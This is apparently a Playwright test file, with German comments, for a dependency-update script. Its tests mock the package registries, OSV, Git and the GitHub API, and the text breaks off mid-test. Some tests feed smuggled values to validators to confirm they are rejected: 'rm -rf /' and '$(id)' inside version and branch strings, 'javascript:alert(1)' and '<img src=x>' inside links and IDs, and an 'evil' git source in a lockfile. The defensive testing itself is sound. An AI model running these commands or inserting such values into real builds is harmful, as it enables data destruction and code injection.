// Komponenten-Updates (scripts/komponenten-updates.mjs) mit nachgebauten Registries, OSV, Git und GitHub-API.
// Unabhängig vom Gerät: läuft nur einmal im Projekt logik (Markierung @logik).
const { test, expect } = require("@playwright/test");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execFileSync } = require("child_process");
const { pathToFileURL } = require("url");

const SKRIPT = path.join(__dirname, "..", "scripts", "komponenten-updates.mjs");
const lade = () => import(pathToFileURL(SKRIPT).href);
const L = { tag: "@logik" };
const TAG = 86_400_000, JETZT = Date.parse("2026-11-16T05:41:00Z");
const vor = (tage) => new Date(JETZT - tage * TAG).toISOString();
const D = (c) => "sha256:" + c.repeat(64);
const R = "ooeler/InterChampionship";
const BOT_MAIL = "41898283+github-actions[bot]@users.noreply.github.com";

// ---- Ausgangsstand wie im Repository ----
const PKG = `{
  "name": "interchampionship",
  "scripts": {
    "postinstall": "node scripts/vendor.js"
  },
  "dependencies": {
    "@supabase/supabase-js": "2.118.0"
  },
  "devDependencies": {
    "@playwright/test": "1.64.1",
    "http-server": "14.1.1"
  }
}
`;
const lock = (v) => JSON.stringify({
  name: "interchampionship", lockfileVersion: 3, requires: true,
  packages: {
    "": { name: "interchampionship", dependencies: { "@supabase/supabase-js": v.sb }, devDependencies: { "@playwright/test": v.pw, "http-server": v.hs } },
    "node_modules/@supabase/supabase-js": { version: v.sb, resolved: `https://registry.npmjs.org/@supabase/supabase-js/-/supabase-js-${v.sb}.tgz`, integrity: "sha512-x" },
    "node_modules/@playwright/test": { version: v.pw, resolved: `https://registry.npmjs.org/@playwright/test/-/test-${v.pw}.tgz`, integrity: "sha512-y", dev: true },
    "node_modules/http-server": { version: v.hs, resolved: `https://registry.npmjs.org/http-server/-/http-server-${v.hs}.tgz`, integrity: "sha512-z", dev: true },
  },
}, null, 2) + "\n";
const BILDER = (pw = "1.64.1", dpw = D("a"), sg = "1.183.0", dsg = D("b")) => JSON.stringify({
  playwright: `mcr.microsoft.com/playwright:v${pw}-noble@${dpw}`, semgrep: `semgrep/semgrep:${sg}@${dsg}` }, null, 2) + "\n";
const FN = {
  "supabase/functions/invite/index.ts": `import { createClient } from "npm:@supabase/supabase-js@2.118.0";\nconst x = 1;\n`,
  "supabase/functions/notify/index.ts": `import webpush from "npm:web-push@3.6.7";\nimport { createClient } from 'npm:@supabase/supabase-js@2.118.0';\n`,
  "supabase/functions/_shared/mailer.ts": `async function smtp() {\n  const { default: nodemailer } = await import("npm:nodemailer@6.9.16");\n}\n`,
};
const DATEIEN = () => ({ "package.json": PKG, "package-lock.json": lock({ sb: "2.118.0", pw: "1.64.1", hs: "14.1.1" }), ".github/container-images.json": BILDER(), ...FN });

// ---- Registries: npm-Dokumente, OSV-Meldungen, Images, Semgrep-Releases ----
const doc = (repo, eintraege, latest) => {
  const versions = {}, time = {};
  for (const [v, tage, extra] of eintraege) { versions[v] = { ...(extra || {}) }; time[v] = vor(tage); }
  return { "dist-tags": { latest: latest || eintraege[eintraege.length - 1][0] }, versions, time, repository: { url: `git+https://github.com/${repo}.git` } };
};
const NPM = () => ({
  "@supabase/supabase-js": doc("supabase/supabase-js", [["2.118.0", 30], ["2.119.0", 9], ["2.120.0", 3], ["3.0.0-beta.1", 20]], "2.120.0"),
  "@playwright/test": doc("microsoft/playwright", [["1.64.1", 33], ["1.65.0", 10], ["2.0.0", 8]]),
  "http-server": doc("http-party/http-server", [["14.1.1", 900]]),
  "web-push": doc("web-push-libs/web-push", [["3.6.7", 700], ["3.6.8", 20, { deprecated: "kaputt" }], ["4.0.0", 40]]),
  nodemailer: doc("nodemailer/nodemailer", [["6.9.16", 400], ["6.10.1", 300], ["7.0.7", 60], ["10.1.4", 2], ["10.3.1", 15]]),
});
const vuln = (id, name, events, extra = {}) => ({ id, affected: [{ package: { ecosystem: "npm", name }, ranges: [{ type: "SEMVER", events }] }], ...extra });
const OSV = () => [
  vuln("GHSA-aaaa-bbbb-cccc", "nodemailer", [{ introduced: "0" }, { fixed: "7.0.7" }]),
  vuln("GHSA-dddd-eeee-ffff", "nodemailer", [{ introduced: "3.0.0" }, { fixed: "10.1.4" }]),
  vuln("GHSA-zuru-eckg-ezog", "nodemailer", [{ introduced: "0" }, { fixed: "1.0.0" }], { withdrawn: "2026-01-01T00:00:00Z" }),
];
function quellen({ npm = NPM(), osv = OSV(), bilder = { "playwright@1.65.0": D("c"), "playwright@2.0.0": D("e"), "semgrep@1.184.0": D("d"), "semgrep@1.185.0": D("f") }, releases, log = [] } = {}) {
  return {
    log,
    npm: async (n) => { log.push(`npm ${n}`); if (!npm[n]) throw new Error("404"); return npm[n]; },
    osv: async (Q) => { log.push(`osv ${Q.map((q) => `${q.package.name}@${q.version}`).join(",")}`); return Q.map((q) => ({ vulns: osv.filter((v) => v.affected.some((a) => a.package.name === q.package.name)).map((v) => ({ id: v.id })) })); },
    vuln: async (id) => osv.find((v) => v.id === id),
    digest: async (b, v) => bilder[`${b}@${v}`] || null,
    releases: async () => releases || [
      { tag_name: "v1.186.0", published_at: vor(2), draft: false, prerelease: false },
      { tag_name: "v1.185.0", published_at: vor(8), draft: false, prerelease: true },
      { tag_name: "v1.184.0", published_at: vor(9), draft: false, prerelease: false },
      { tag_name: "v1.183.0", published_at: vor(40), draft: false, prerelease: false },
    ],
  };
}
const kurz = (G) => G.map((u) => `${u.typ === "npm" ? u.name : u.name + "-Image"} ${u.alt}→${u.neu}`);

test.describe("Komponenten-Updates", () => {
  test("Versionen vergleichen und Art bestimmen (SemVer, 0.x)", L, async () => {
    const m = await lade();
    expect(["1.2.10", "1.10.0", "1.2.9", "0.9.0"].sort(m.vergleiche)).toEqual(["0.9.0", "1.2.9", "1.2.10", "1.10.0"]);
    expect(m.art("1.2.3", "1.2.4")).toBe("patch");
    expect(m.art("1.2.3", "1.3.0")).toBe("minor");
    expect(m.art("1.2.3", "2.0.0")).toBe("major");
    expect(m.art("0.2.3", "0.3.0")).toBe("major");
    expect(m.art("1.2.3", "1.2.3")).toBe("gleich");
    expect(m.art("1.2.3", "1.2.2")).toBe("zurueck");
  });

  test("OSV: betroffene Bereiche (introduced/fixed/last_affected), andere Pakete, zurückgezogene Meldungen", L, async () => {
    const m = await lade();
    const v = vuln("X-1", "p", [{ introduced: "0" }, { fixed: "1.2.0" }, { introduced: "2.0.0" }, { last_affected: "2.1.0" }]);
    expect(["1.0.0", "1.1.9", "1.2.0", "1.9.9", "2.0.0", "2.1.0", "2.1.1"].map((x) => m.betroffen(v, "p", x))).toEqual([true, true, false, false, true, true, false]);
    expect(m.betroffen(v, "q", "1.0.0")).toBe(false);
    expect(m.betroffen({ ...v, withdrawn: "2026-01-01" }, "p", "1.0.0")).toBe(false);
    expect(m.betroffen({ id: "X", affected: [{ package: { ecosystem: "npm", name: "p" }, versions: ["3.0.0"] }] }, "p", "3.0.0")).toBe(true);
    expect(m.betroffen({ id: "X", affected: [{ package: { ecosystem: "Maven", name: "p" }, versions: ["3.0.0"] }] }, "p", "3.0.0")).toBe(false);
  });

  test("Stabile Versionen: ohne Vorabversionen, veraltete und solche über latest", L, async () => {
    const m = await lade();
    const n = NPM();
    expect(m.stabileVersionen(n["@supabase/supabase-js"]).map((x) => x.v)).toEqual(["2.118.0", "2.119.0", "2.120.0"]);
    expect(m.stabileVersionen(n["web-push"]).map((x) => x.v)).toEqual(["3.6.7", "4.0.0"]);
    expect(m.stabileVersionen({ "dist-tags": { latest: "1.0.0; rm -rf /" }, versions: { "1.0.0": {} }, time: {} })).toEqual([]);
  });

  test("Lesen: package.json, Function-Imports (auch dynamisch) und Images; feste Versionen verlangt", L, async () => {
    const m = await lade();
    const k = m.komponentenLesen(DATEIEN());
    expect(k.fehler).toEqual([]);
    expect(k.npm["@supabase/supabase-js"]).toEqual({ version: "2.118.0", uneinheitlich: false, orte: ["package.json", "supabase/functions/invite/index.ts", "supabase/functions/notify/index.ts"] });
    expect(k.npm.nodemailer.orte).toEqual(["supabase/functions/_shared/mailer.ts"]);
    expect(k.bilder).toEqual({ playwright: { version: "1.64.1", digest: D("a") }, semgrep: { version: "1.183.0", digest: D("b") } });
    const f = m.komponentenLesen({ ...DATEIEN(), "supabase/functions/ops/index.ts": `import x from "npm:@supabase/supabase-js@^2";`, ".github/container-images.json": `{"playwright":"evil/image:v1.64.1-noble","semgrep":"semgrep/semgrep:1.183.0@sha256:${"b".repeat(64)}","neu":"x"}` }).fehler;
    expect(f.join("\n")).toContain("@supabase/supabase-js@^2 ist keine feste Version");
    expect(f.join("\n")).toContain("playwright fehlt oder hat nicht die Form");
    expect(f.join("\n")).toContain("unbekannter Eintrag neu");
    const u = m.komponentenLesen({ ...DATEIEN(), "supabase/functions/ops/index.ts": `import x from "npm:@supabase/supabase-js@2.117.0/dist/x.js";` });
    expect(u.npm["@supabase/supabase-js"]).toMatchObject({ version: "2.118.0", uneinheitlich: true });
  });

  test("Anwenden: nur Versions-Strings und Digests ändern sich, überall gleich", L, async () => {
    const m = await lade();
    const d = { ...DATEIEN(), "supabase/functions/ops/index.ts": `import a from "npm:@supabase/supabase-js@2.118.0/dist/module/x.js";\nimport b from "npm:other@1.0.0";\n` };
    const neu = m.anwenden(d, { npm: { "@supabase/supabase-js": "2.119.0", nodemailer: "10.1.4", "@playwright/test": "1.65.0" }, bilder: { playwright: { version: "1.65.0", digest: D("c") } } });
    expect(Object.keys(neu).sort()).toEqual([".github/container-images.json", "package.json", "supabase/functions/_shared/mailer.ts", "supabase/functions/invite/index.ts", "supabase/functions/notify/index.ts", "supabase/functions/ops/index.ts"]);
    expect(neu["package.json"]).toBe(PKG.replace('"2.118.0"', '"2.119.0"').replace('"1.64.1"', '"1.65.0"'));
    expect(neu["supabase/functions/notify/index.ts"]).toBe(FN["supabase/functions/notify/index.ts"].replace("2.118.0", "2.119.0"));
    expect(neu["supabase/functions/ops/index.ts"]).toBe(`import a from "npm:@supabase/supabase-js@2.119.0/dist/module/x.js";\nimport b from "npm:other@1.0.0";\n`);
    expect(neu["supabase/functions/_shared/mailer.ts"]).toContain(`await import("npm:nodemailer@10.1.4")`);
    expect(JSON.parse(neu[".github/container-images.json"])).toEqual({ playwright: `mcr.microsoft.com/playwright:v1.65.0-noble@${D("c")}`, semgrep: `semgrep/semgrep:1.183.0@${D("b")}` });
    // ungeprüfte Werte werden nie geschrieben
    expect(() => m.anwenden(d, { npm: { nodemailer: "10.1.4\"; evil" } })).toThrow(/Ungültiges Ziel/);
    expect(() => m.anwenden(d, { npm: {}, bilder: { semgrep: { version: "1.2.3", digest: "sha256:kurz" } } })).toThrow(/Ungültiges Image-Ziel/);
    expect(() => m.anwenden(d, { npm: {}, bilder: { anderes: { version: "1.2.3", digest: D("c") } } })).toThrow(/Ungültiges Image-Ziel/);
  });

  test("Lockfile: passt zu package.json, nur aus der npm-Registry", L, async () => {
    const m = await lade();
    expect(m.lockPruefen(PKG, lock({ sb: "2.118.0", pw: "1.64.1", hs: "14.1.1" }))).toBeNull();
    expect(m.lockPruefen(PKG, lock({ sb: "2.119.0", pw: "1.64.1", hs: "14.1.1" }))).toContain("dependencies passen nicht");
    const l = JSON.parse(lock({ sb: "2.118.0", pw: "1.64.1", hs: "14.1.1" }));
    l.packages["node_modules/http-server"].resolved = "git+https://github.com/evil/x.git";
    expect(m.lockPruefen(PKG, JSON.stringify(l))).toContain("nicht aus der npm-Registry");
    l.packages["node_modules/http-server"].resolved = "https://registry.npmjs.org/http-server/-/http-server-14.1.1.tgz";
    l.packages["node_modules/http-server"].version = "14.1.0";
    expect(m.lockPruefen(PKG, JSON.stringify(l))).toContain("http-server ist nicht 14.1.1");
  });

  test("Wöchentlich: neueste Version ≥ 7 Tage je Gruppe, Playwright-Image dazu, Sicherheitslücke sofort", L, async () => {
    const m = await lade();
    const q = quellen();
    const p = await m.planen({ dateien: DATEIEN(), modus: "woechentlich", quellen: q, jetzt: JETZT });
    // supabase-js 2.120.0 ist erst 3 Tage alt → 2.119.0; Vorabversion 3.0.0-beta.1 nie
    expect(kurz(p.gruppen.standard)).toEqual(["@playwright/test 1.64.1→1.65.0", "playwright-Image 1.64.1→1.65.0", "@supabase/supabase-js 2.118.0→2.119.0", "semgrep-Image 1.183.0→1.184.0"]);
    // Major getrennt; nodemailer: neueste ≥ 7 Tage (10.3.1); web-push 3.6.8 ist veraltet markiert → 4.0.0
    expect(kurz(p.gruppen.major)).toEqual(["@playwright/test 1.64.1→2.0.0", "playwright-Image 1.64.1→2.0.0", "nodemailer 6.9.16→10.3.1", "web-push 3.6.7→4.0.0"]);
    const pw = p.gruppen.standard[1];
    expect(pw).toMatchObject({ digest: D("c"), alterTage: 10, notizen: "https://github.com/microsoft/playwright/releases/tag/v1.65.0", orte: [".github/container-images.json"] });
    expect(p.gruppen.standard[2]).toMatchObject({ alterTage: 9, art: "minor", sicherheit: [], notizen: "https://github.com/supabase/supabase-js/releases/tag/v2.119.0" });
    expect(p.gruppen.major[2].sicherheit.sort()).toEqual(["GHSA-aaaa-bbbb-cccc", "GHSA-dddd-eeee-ffff"]);
    expect(p.befunde).toEqual([{ paket: "nodemailer", version: "6.9.16", ids: ["GHSA-aaaa-bbbb-cccc", "GHSA-dddd-eeee-ffff"], behoben: "10.1.4" }]);
  });

  test("Täglich: nur Sicherheit – kleinste behobene Version auch jünger als 7 Tage; offene PRs behalten ihre Versionen", L, async () => {
    const m = await lade();
    let p = await m.planen({ dateien: DATEIEN(), modus: "sicherheit", quellen: quellen(), jetzt: JETZT });
    expect(kurz(p.gruppen.standard)).toEqual([]);
    expect(kurz(p.gruppen.major)).toEqual(["nodemailer 6.9.16→10.1.4"]);
    expect(p.gruppen.major[0].alterTage).toBe(2);
    // Lücke mit Korrektur im selben Major → Standard-Gruppe (automatischer Merge)
    const osv = [vuln("GHSA-ssss-tttt-uuuu", "@supabase/supabase-js", [{ introduced: "2.0.0" }, { fixed: "2.120.0" }])];
    p = await m.planen({ dateien: DATEIEN(), modus: "sicherheit", quellen: quellen({ osv }), jetzt: JETZT });
    expect(kurz(p.gruppen.standard)).toEqual(["@supabase/supabase-js 2.118.0→2.120.0"]);
    expect(p.gruppen.standard[0]).toMatchObject({ alterTage: 3, sicherheit: ["GHSA-ssss-tttt-uuuu"] });
    // offener PR mit Wochen-Updates: Versionen bleiben, die Sicherheits-Version kommt dazu
    p = await m.planen({ dateien: DATEIEN(), modus: "sicherheit", quellen: quellen(), jetzt: JETZT,
      behalten: { standard: { npm: { "@supabase/supabase-js": "2.119.0", "http-server": "14.1.1" }, bilder: { semgrep: "1.184.0" } }, major: { npm: { nodemailer: "10.3.1" }, bilder: {} } } });
    expect(kurz(p.gruppen.standard)).toEqual(["@supabase/supabase-js 2.118.0→2.119.0", "semgrep-Image 1.183.0→1.184.0"]);
    expect(kurz(p.gruppen.major)).toEqual(["nodemailer 6.9.16→10.3.1"]);
  });

  test("Ziel mit eigener Lücke wird übersprungen; fehlendes Playwright-Image → ältere Version", L, async () => {
    const m = await lade();
    const osv = [vuln("GHSA-wwww-xxxx-yyyy", "@supabase/supabase-js", [{ introduced: "2.119.0" }, { fixed: "2.120.0" }])];
    let p = await m.planen({ dateien: DATEIEN(), modus: "woechentlich", quellen: quellen({ osv }), jetzt: JETZT });
    // 2.119.0 hat eine Lücke → nächste sichere Version derselben Gruppe (2.120.0, Sicherheit vor Wartezeit)
    expect(kurz(p.gruppen.standard)).toContain("@supabase/supabase-js 2.118.0→2.120.0");
    p = await m.planen({ dateien: DATEIEN(), modus: "woechentlich", quellen: quellen({ bilder: { "semgrep@1.184.0": D("d") } }), jetzt: JETZT });
    expect(kurz(p.gruppen.standard).filter((x) => x.includes("playwright"))).toEqual([]);
    expect(p.hinweise.join(" ")).toContain("Playwright-Image v1.65.0-noble fehlt");
  });

  test("Plan aus einem anderen Job wird streng geprüft (keine Shell- oder Markdown-Injektion)", L, async () => {
    const m = await lade();
    const p = await m.planen({ dateien: DATEIEN(), modus: "woechentlich", quellen: quellen(), jetzt: JETZT });
    const gut = { datum: "2026-11-16", modus: "woechentlich", gruppen: { standard: { branch: "fix/abhaengigkeiten-2026-11-16", pr: null, updates: p.gruppen.standard }, major: { branch: "fix/abhaengigkeiten-major-2026-11-16", pr: 7, updates: p.gruppen.major } }, befunde: [], hinweise: [] };
    expect(m.planPruefen(JSON.stringify(gut)).gruppen.major.pr).toBe(7);
    const kaputt = (f) => { const x = JSON.parse(JSON.stringify(gut)); f(x); return () => m.planPruefen(JSON.stringify(x)); };
    expect(kaputt((x) => (x.gruppen.standard.branch = "fix/abhaengigkeiten-2026-11-16;rm -rf"))).toThrow(/branch/);
    expect(kaputt((x) => (x.gruppen.standard.branch = "fix/abhaengigkeiten-major-2026-11-16"))).toThrow(/branch/);
    expect(kaputt((x) => (x.gruppen.standard.updates[0].neu = "1.65.0 $(id)"))).toThrow(/Version/);
    expect(kaputt((x) => (x.gruppen.standard.updates[0].neu = "2.0.0"))).toThrow(/Art/);
    expect(kaputt((x) => (x.gruppen.standard.updates[1].digest = "sha256:abc"))).toThrow(/Digest/);
    expect(kaputt((x) => (x.gruppen.standard.updates[0].notizen = "javascript:alert(1)"))).toThrow(/Link/);
    expect(kaputt((x) => (x.gruppen.major.updates[2].sicherheit = ["<img src=x>"]))).toThrow(/OSV/);
    expect(kaputt((x) => (x.gruppen.major.pr = "7"))).toThrow(/pr/);
    expect(kaputt((x) => (x.gruppen.standard.updates[0].name = "a b"))).toThrow(/Komponente/);
  });

  test("PR-Text: Tabelle alt → neu, Alter, Release Notes, Lücken; Major mit Hinweis", L, async () => {
    const m = await lade();
    const p = await m.planen({ dateien: DATEIEN(), modus: "woechentlich", quellen: quellen(), jetzt: JETZT });
    const s = m.beschreibung("standard", p.gruppen.standard);
    expect(s.startsWith("<!-- komponenten-updates:standard -->")).toBe(true);
    expect(s).toContain("| `@supabase/supabase-js` | package.json, 2 Function-Dateien | 2.118.0 → **2.119.0** | Minor | 9 Tage | – | [Release Notes](https://github.com/supabase/supabase-js/releases/tag/v2.119.0) |");
    expect(s).toContain("automatisch gemergt");
    expect(m.titel("standard", p.gruppen.standard)).toBe("Abhängigkeiten aktualisieren: 4 Komponenten");
    const g = m.beschreibung("major", p.gruppen.major);
    expect(g).toContain("wird nicht automatisch gemergt");
    expect(g).toContain("major_freigeben");
    expect(g).toContain("[GHSA-aaaa-bbbb-cccc](https://osv.dev/vulnerability/GHSA-aaaa-bbbb-cccc)");
    expect(m.titel("major", p.gruppen.major.slice(2, 3))).toBe("Sicherheit: Major-Update prüfen: nodemailer");
  });

  // ---- Bauen mit echtem Git (Kopie im Temp-Ordner, origin als lokales Bare-Repository) ----
  test("Bauen: ein Commit je Gruppe auf main, unveränderte Branches nicht neu, fremde Commits nie überschreiben", L, async () => {
    test.setTimeout(120_000);
    const m = await lade();
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "komp-"));
    const g = (cwd, ...a) => execFileSync("git", a, { cwd, encoding: "utf8" }).trim();
    try {
      const ur = path.join(dir, "ur.git"), wk = path.join(dir, "wk");
      g(dir, "init", "-q", "--bare", "-b", "main", ur);
      g(dir, "clone", "-q", ur, wk);
      for (const [p, t] of Object.entries(DATEIEN())) { fs.mkdirSync(path.dirname(path.join(wk, p)), { recursive: true }); fs.writeFileSync(path.join(wk, p), t); }
      g(wk, "add", "-A");
      g(wk, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "start");
      g(wk, "push", "-q", "origin", "HEAD:main");
      const p = await m.planen({ dateien: DATEIEN(), modus: "woechentlich", quellen: quellen(), jetzt: JETZT });
      const plan = { datum: "2026-11-16", modus: "woechentlich", gruppen: { standard: { branch: "fix/abhaengigkeiten-2026-11-16", pr: null, updates: p.gruppen.standard }, major: { branch: "fix/abhaengigkeiten-major-2026-11-16", pr: null, updates: [] } }, befunde: [], hinweise: [] };
      const git = m.gitIn(wk);
      // npm install --package-lock-only nachgebaut: Lockfile aus package.json
      const npmLock = () => { const j = JSON.parse(fs.readFileSync(path.join(wk, "package.json"), "utf8")); fs.writeFileSync(path.join(wk, "package-lock.json"), lock({ sb: j.dependencies["@supabase/supabase-js"], pw: j.devDependencies["@playwright/test"], hs: j.devDependencies["http-server"] })); };
      const bau = () => m.bauen({ plan, git, cwd: wk, npmLock, lesen: () => m.dateienLesen({ git, cwd: wk }) });
      const a = bau();
      expect(a.ergebnis.major).toEqual({ status: "leer", sha: "" });
      expect(a.ergebnis.standard.status).toBe("neu");
      expect(a.push).toEqual([`fix/abhaengigkeiten-2026-11-16=${a.ergebnis.standard.sha}=`]);
      const sha = a.ergebnis.standard.sha;
      expect(g(wk, "log", "--format=%an|%ae|%s", "-1", sha)).toBe(`github-actions[bot]|${BOT_MAIL}|Abhängigkeiten aktualisieren: 4 Komponenten`);
      expect(g(wk, "diff", "--name-only", "HEAD", sha).split("\n").sort()).toEqual([".github/container-images.json", "package-lock.json", "package.json", "supabase/functions/invite/index.ts", "supabase/functions/notify/index.ts"]);
      expect(g(wk, "rev-parse", "HEAD")).toBe(g(wk, "rev-parse", "origin/main")); // Arbeitsstand wieder auf main
      // gepusht (wie der Workflow) → nächster Lauf: gleicher Stand, nichts zu tun
      g(wk, "push", "-q", "origin", `${sha}:refs/heads/fix/abhaengigkeiten-2026-11-16`);
      expect(bau().ergebnis.standard).toEqual({ status: "gleich", sha });
      // main ist weitergegangen → Branch liegt dahinter → neu bauen
      fs.writeFileSync(path.join(wk, "README.md"), "x\n");
      g(wk, "add", "-A"); g(wk, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "weiter"); g(wk, "push", "-q", "origin", "HEAD:main");
      const c = bau();
      expect(c.ergebnis.standard.status).toBe("neu");
      expect(c.push).toEqual([`fix/abhaengigkeiten-2026-11-16=${c.ergebnis.standard.sha}=${sha}`]);
      // jemand anderes hat auf den Branch gepusht → nicht überschreiben
      g(wk, "checkout", "-q", "--detach", sha);
      fs.writeFileSync(path.join(wk, "x.txt"), "y\n");
      g(wk, "add", "-A"); g(wk, "-c", "user.name=p", "-c", "user.email=p@p", "commit", "-q", "-m", "von Hand"); g(wk, "push", "-q", "-f", "origin", "HEAD:refs/heads/fix/abhaengigkeiten-2026-11-16");
      g(wk, "checkout", "-q", "--detach", "origin/main");
      expect(bau().ergebnis.standard).toEqual({ status: "fremd", sha: "" });
      // Plan passt nicht mehr zu main (z. B. inzwischen von Hand aktualisiert) → Gruppe überspringen
      const veraltet = { ...plan, gruppen: { ...plan.gruppen, standard: { ...plan.gruppen.standard, updates: [{ ...plan.gruppen.standard.updates[2], alt: "2.117.0" }] } } };
      expect(m.bauen({ plan: veraltet, git, cwd: wk, npmLock, lesen: () => m.dateienLesen({ git, cwd: wk }) }).ergebnis.standard.status).toBe("veraltet");
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  // ---- Veröffentlichen mit nachgebauter GitHub-API ----
  function apiMock({ fehlerBeiPr } = {}) {
    const log = [];
    const api = async (pfad, { method = "GET", body } = {}) => {
      log.push(`${method} ${pfad}${body ? " " + JSON.stringify(body) : ""}`);
      if (method === "POST" && pfad === `repos/${R}/pulls`) {
        if (fehlerBeiPr) { const e = new Error("HTTP 403"); e.status = 403; e.text = "GitHub Actions is not permitted to create or approve pull requests."; throw e; }
        return { number: 42 };
      }
      if (method === "POST" && pfad === `repos/${R}/labels`) { const e = new Error("HTTP 422"); e.status = 422; throw e; }
      if (method === "GET" && pfad.startsWith(`repos/${R}/issues?`)) return log.filter((l) => l.startsWith(`POST repos/${R}/issues `)).map(() => ({ title: "Komponenten-Updates: Pull Request konnte nicht erstellt werden" }));
      return {};
    };
    return { api, log };
  }
  async function planFuer(m) {
    const p = await m.planen({ dateien: DATEIEN(), modus: "woechentlich", quellen: quellen(), jetzt: JETZT });
    return { datum: "2026-11-16", modus: "woechentlich", gruppen: { standard: { branch: "fix/abhaengigkeiten-2026-11-16", pr: null, updates: p.gruppen.standard }, major: { branch: "fix/abhaengigkeiten-major-2026-11-09", pr: 17, updates: p.gruppen.major } }, befunde: [], hinweise: [] };
  }
  const S = "a".repeat(40);

  test("Veröffentlichen: neuer PR mit Labels und Prüfung, vorhandener PR aktualisiert statt doppelt", L, async () => {
    const m = await lade();
    const plan = await planFuer(m);
    const { api, log } = apiMock();
    const a = await m.veroeffentlichen({ plan, ergebnis: { standard: { status: "neu", sha: S }, major: { status: "neu", sha: S } }, api, repo: R, log: () => {} });
    expect(a).toEqual(["standard: PR #42 erstellt, Prüfung gestartet", "major: PR #17 aktualisiert, Prüfung gestartet"]);
    expect(log.filter((l) => l.startsWith(`POST repos/${R}/pulls `))).toHaveLength(1); // nur für die Gruppe ohne PR
    expect(log).toContain(`POST repos/${R}/issues/42/labels {"labels":["abhaengigkeiten"]}`);
    expect(log).toContain(`POST repos/${R}/issues/17/labels {"labels":["abhaengigkeiten","manuell-pruefen","sicherheit"]}`);
    expect(log).toContain(`POST repos/${R}/actions/workflows/komponenten-pruefen.yml/dispatches {"ref":"fix/abhaengigkeiten-2026-11-16","inputs":{"pr":"42"}}`);
    expect(log).toContain(`POST repos/${R}/actions/workflows/komponenten-pruefen.yml/dispatches {"ref":"fix/abhaengigkeiten-major-2026-11-09","inputs":{"pr":"17"}}`);
    expect(log.some((l) => l.startsWith(`PATCH repos/${R}/pulls/17 `) && l.includes('"title":"Sicherheit: Major-Update prüfen'))).toBe(true);
  });

  test("Veröffentlichen: unverändert ohne neue Prüfung, leer schliesst, fremd bleibt, ohne PR-Recht ein Issue", L, async () => {
    const m = await lade();
    const plan = await planFuer(m);
    let { api, log } = apiMock();
    await m.veroeffentlichen({ plan: { ...plan, gruppen: { ...plan.gruppen, standard: { ...plan.gruppen.standard, pr: 40 } } }, ergebnis: { standard: { status: "gleich", sha: S }, major: { status: "fremd", sha: "" } }, api, repo: R, log: () => {} });
    expect(log.some((l) => l.includes("dispatches"))).toBe(false);
    expect(log.some((l) => l.includes("/pulls/17"))).toBe(false);
    ({ api, log } = apiMock());
    await m.veroeffentlichen({ plan, ergebnis: { standard: { status: "leer", sha: "" }, major: { status: "leer", sha: "" } }, api, repo: R, log: () => {} });
    expect(log).toContain(`PATCH repos/${R}/pulls/17 {"state":"closed"}`);
    expect(log.filter((l) => l.startsWith("POST") || l.startsWith("PATCH"))).toHaveLength(2); // Kommentar + Schliessen, nichts für standard
    ({ api, log } = apiMock({ fehlerBeiPr: true }));
    const meldungen = [];
    const a = await m.veroeffentlichen({ plan: { ...plan, gruppen: { ...plan.gruppen, major: { ...plan.gruppen.major, pr: null } } }, ergebnis: { standard: { status: "neu", sha: S }, major: { status: "neu", sha: S } }, api, repo: R, log: (x) => meldungen.push(x) });
    expect(a).toEqual(["standard: Issue statt PR", "major: Issue statt PR"]);
    expect(log.filter((l) => l.startsWith(`POST repos/${R}/issues `))).toHaveLength(1); // ein Hinweis-Issue, nicht zwei
    expect(log.find((l) => l.startsWith(`POST repos/${R}/issues `))).toContain("Allow GitHub Actions to create and approve pull requests");
    expect(log.some((l) => l.includes("dispatches"))).toBe(false);
    expect(meldungen.join(" ")).toContain("::warning::");
  });

  // ---- Regelprüfung vor dem Merge (nachgebautes git und API) ----
  const KOPF = "c".repeat(40), MB = "d".repeat(40);
  function regelLauf(m, { aendern = (d) => d, git: gitA = {}, pr = {}, env = {}, q = {}, dateienKopf } = {}) {
    const alt = DATEIEN();
    const ziel = { npm: { "@supabase/supabase-js": "2.119.0", "@playwright/test": "1.65.0" }, bilder: { playwright: { version: "1.65.0", digest: D("c") } } };
    let kopf = { ...alt, ...m.anwenden(alt, ziel), "package-lock.json": lock({ sb: "2.119.0", pw: "1.65.0", hs: "14.1.1" }) };
    kopf = dateienKopf || aendern(kopf);
    const stand = { [MB]: alt, [KOPF]: kopf };
    const geaendert = [...new Set([...Object.keys(alt), ...Object.keys(kopf)])].filter((p) => alt[p] !== kopf[p]);
    const G = { autoren: `${BOT_MAIL} ${BOT_MAIL}`, hinter: "0", diff: geaendert.join("\n"), ...gitA };
    const git = (...a) => {
      if (a[0] === "fetch") return "";
      if (a[0] === "merge-base") return MB;
      if (a[0] === "rev-list") return G.hinter;
      if (a[0] === "log") return G.autoren;
      if (a[0] === "diff") return G.diff;
      if (a[0] === "ls-tree") return Object.keys(stand[a[3]]).join("\n");
      if (a[0] === "show") { const [ref, p] = [a[1].slice(0, 40), a[1].slice(41)]; return stand[ref][p].replace(/\n$/, ""); }
      throw new Error("git " + a.join(" "));
    };
    const api = async (p) => {
      if (p === `repos/${R}/pulls/5`) return { user: { login: "github-actions[bot]" }, head: { repo: { full_name: R }, ref: "fix/abhaengigkeiten-2026-11-16", sha: KOPF }, base: { ref: "main" }, state: "open", draft: false, ...pr };
      throw new Error("404");
    };
    return m.regelnPruefen({ env: { GITHUB_REPOSITORY: R, PR: "5", KOPF, REF: "fix/abhaengigkeiten-2026-11-16", FREIGABE: "false", AUSLOESER: "github-actions[bot]", ...env }, api, git, quellen: quellen(q), jetzt: JETZT });
  }

  test("Regeln: gültiges Update wird gemergt, Release nur bei App/Functions", L, async () => {
    const m = await lade();
    const r = await regelLauf(m);
    expect(r).toEqual({ ergebnis: "ok", grund: "Alle Regeln erfüllt (2 Paket(e), 1 Image(s))", release: "ja", pr: "5" });
    // nur Entwicklungswerkzeuge (Playwright + Image) → kein Release
    const alt = DATEIEN();
    const nurDev = { ...alt, ...m.anwenden(alt, { npm: { "@playwright/test": "1.65.0" }, bilder: { playwright: { version: "1.65.0", digest: D("c") } } }), "package-lock.json": lock({ sb: "2.118.0", pw: "1.65.0", hs: "14.1.1" }) };
    expect(await regelLauf(m, { dateienKopf: nurDev })).toMatchObject({ ergebnis: "ok", release: "nein" });
